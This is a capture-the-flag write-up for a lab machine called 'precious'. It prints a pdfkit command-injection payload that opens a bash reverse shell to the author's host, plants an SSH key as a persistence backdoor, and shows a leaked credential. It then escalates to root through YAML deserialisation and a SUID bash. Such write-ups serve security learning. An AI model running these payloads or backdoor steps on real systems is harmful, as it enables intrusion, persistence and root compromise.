When we do our initial nmap scan we find that port 80 and 22 are both open.

Atm we have no credentials so sshing is not an option so ofc we go and have a look at the webiste.

Its a html to pdf generator, created a Hello World index.html file

echo "Hello World" > index.html
python -m http.server

http://10.10.14.2:8000/index.html

(index.html is redundant as it will automatically return it if present)

Then gave it to the website and it gave us our pdf with hello world written on it.

Tried  giving it a php file that launches a reverse shell with netcat listener but no success :(

When I analysed the pdf it generated, it showed that the pdf was generated by pdfkit so I googled for some exploits and came across a aritrary code execution vulnerability so this was our foothold

Found a pay load that worked

https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
http://example.com/?name=#{'%20`sleep 5`'}

and the sleeping worked :)

So now we google some reverse shell payloads and after some frustration with netcat and python this payload worked 

http://10.10.14.2:9001/?name=#{'%20`bash -c 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1'`'}

Opened up a nc listener on port 9001

and BOOM we got a reverse shell

Now because I hate using a bash shell through netcat I made myself a backdoor using ssh

generated an ssh key pair and made a .shh folder and authorized_keys file as they weren't there yet and copied my ssh public key to it. Now I can ssh as ruby using my private key and now I have got a persistant shell into the machine and can work on it more comfortably.

ssh -i pivatekey ruby@target

Looking for the flag in the ruby folder gives us nothing unfortunately so I looked the home folder and found another user named henry and this user has the user.txt flag but unfortunately only he can view

So now I had to find a way of viewing his files

After some snooping around in the ruby folder there is a config file in ./bundle/config that contained henry's credentials so now we can log in as henry and obtain the user.txt flag

cat .bundle/config 
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"

Come back to write the rest

The privesc exploit here was through yaml-deserialisation

there was a ruby file that was able to run as root without a password after using sudo -l

https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/

henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb

The update_dependencies file source code:

henry@precious:~$ cat /opt/update_dependencies.rb 
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end

loads a file called dependencies.yml so initially I tried to make the file inside the folder of the ruby file but I didn't have permission so I made it inside my home directory and changed the git_set file to change the permissions of the bash shell for users to run

sudo ruby /opt/update_dependencies.rb inside the folder with the dependencies.yml file

then after we run the ruby file and it worked we can run execute the shell /bin/bash -p and if we run whoami, we've got root

henry@precious:~$ /bin/bash -p
bash-5.1# whoami
root
bash-5.1# 


Now just navigate to the root folder and get the root.txt flag

